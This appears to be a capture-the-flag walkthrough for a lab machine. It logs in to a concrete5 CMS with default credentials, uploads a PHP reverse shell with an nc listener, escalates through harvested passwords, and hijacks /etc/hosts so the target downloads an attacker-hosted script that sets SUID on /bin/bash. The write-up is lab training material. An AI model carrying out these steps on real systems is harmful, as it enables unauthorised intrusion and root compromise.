@@ -1,0 +1,94 @@
+I started with an nmap scan:
+
+nmap -sV -sS 10.10.190.204  
+PORT   STATE SERVICE VERSION
+85/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+
+So I went to:
+http://10.10.190.204:85/
+
+Nothing interesting, so I used gobuster:
+gobuster dir -u http://10.10.190.204:85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+I got:
+/app
+
+And on: 
+http://10.10.190.204:85/app/
+ I clicked on Jump and was redirected:
+http://10.10.190.204:85/app/castle/
+
+
+On the bottom of the site I found "Built with concrete5 CMS" so I researched for vulnerabilities for the version 8.5.2 and found some CVEs.
+In the login page I tried: admin:admin and admin:password
+The later worked.
+
+Next, I tried one exploit from one of the CVEs. I had to allow the php extension on the allow list and then I uploaded a php script from: https://github.com/pentestmonkey/php-reverse-shell
+I set up a listener on my attack machine: nc -lvnp 1337
+
+And spwaned a shell:
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+
+I tried some commands but they were not very useful:
+sudo -l
+find / -perm -4000
+
+
+So I decided to use linpeas.sh
+I quickly found a password that looked like from the user toad so I tried and it worked.
+
+
+I ran linpeash.sh again and after a lot of trial and errors I finally found a token encoded in Base 64, it was the password for another user: Mario
+
+With Mario, I was able to get the first flag with the command Head.
+
+
+Then, after a lot of struggle I found the user Mario had writing permissions on /etc/hosts
+I tried to edit the hosts file but I couldn't do it with vim or nano so I had to do some research to find the right command and finally I did it:
+
+cat /etc/hosts | sed 's/127\.0\.1\.1\tmkingdom\.thm/IP\.IP\.IP\.IP\t\tmkingdom.thm/g' > /tmp/hosts
+
+I finally edited the file, now on my VM I just needed to create the same file path /app/castle/application
+Inside of it I created a script:
+#! /bin/bash
+chmod u+s /bin/bash   (This command sets the SUID (Set User ID) bit on the /bin/bash binary.)
+
+I then started a web server and just used this command on the target machine: curl mkingdom.thm:85/app/castle/application/counter.sh
+After that: /bin/bash -p
+And I had root.
+
+Last command:
+Head /root/root.txt
+
+And I got the final flag.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
